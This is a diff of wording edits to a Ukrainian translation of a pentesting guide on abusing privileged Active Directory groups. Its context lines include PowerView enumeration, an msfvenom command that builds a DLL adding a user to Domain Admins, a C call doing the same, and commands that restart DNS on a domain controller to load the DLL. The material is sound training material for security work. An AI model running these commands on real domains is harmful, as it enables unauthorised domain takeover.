@@ -12,7 +12,7 @@
 
 Ця група має право створювати облікові записи та групи, які не є адміністраторами домену. Крім того, вона дозволяє локальний вхід до Контролера домену (DC).
 
-Щоб визначити членів цієї групи, виконується наступна команда:
+Щоб ідентифікувати членів цієї групи, виконується наступна команда:
 ```powershell
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
@@ -54,7 +54,7 @@ C:\> .\PsService.exe security AppReadiness
 
 ## Backup Operators
 
-Членство в групі `Backup Operators` надає доступ до файлової системи `DC01` завдяки привілеям `SeBackup` та `SeRestore`. Ці привілеї дозволяють проходження через папки, їх перелік та копіювання файлів, навіть без явних дозволів, використовуючи прапорець `FILE_FLAG_BACKUP_SEMANTICS`. Для цього процесу необхідно використовувати специфічні скрипти.
+Членство в групі `Backup Operators` надає доступ до файлової системи `DC01` завдяки привілеям `SeBackup` та `SeRestore`. Ці привілеї дозволяють обходити папки, перераховувати та копіювати файли, навіть без явних дозволів, використовуючи прапорець `FILE_FLAG_BACKUP_SEMANTICS`. Для цього процесу необхідно використовувати специфічні скрипти.
 
 Щоб перерахувати членів групи, виконайте:
 ```powershell
@@ -158,7 +158,7 @@ system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /doma
 // Generate DLL with msfvenom
 msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
 ```
-Перезапуск служби DNS (що може вимагати додаткових дозволів) необхідний для завантаження DLL:
+Перезапуск служби DNS (який може вимагати додаткових дозволів) необхідний для завантаження DLL:
 ```csharp
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
@@ -215,7 +215,7 @@ sc.exe start MozillaMaintenance
 ```powershell
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
-Для більш детальних технік експлуатації, пов'язаних з **`SeLoadDriverPrivilege`**, слід звернутися до специфічних ресурсів безпеки.
+Для більш детальних технік експлуатації, пов'язаних з **`SeLoadDriverPrivilege`**, слід звернутися до конкретних ресурсів безпеки.
 
 #### Користувачі віддаленого робочого столу
 
@@ -224,7 +224,7 @@ Get-NetGroupMember -Identity "Print Operators" -Recurse
 Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
 ```
-Додаткову інформацію про експлуатацію RDP можна знайти в спеціалізованих ресурсах для пентестингу.
+Додаткову інформацію про експлуатацію RDP можна знайти в спеціалізованих ресурсах з пентестингу.
 
 #### Користувачі віддаленого керування
 
